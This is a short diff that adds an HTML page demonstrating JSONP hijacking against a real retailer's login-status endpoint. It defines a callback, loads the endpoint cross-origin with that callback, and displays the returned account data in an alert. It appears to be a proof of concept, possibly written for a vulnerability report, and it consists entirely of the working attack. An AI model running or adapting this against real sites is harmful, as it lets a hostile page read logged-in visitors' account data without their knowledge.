@@ -1,0 +1,6 @@
+<script>
+    callback=function(x){
+        alert(JSON.stringify(x));
+    }
+</script>
+<script src="https://m.kohls.com/upgrade/myaccount/login_status.jsp?callback=callback"></script>
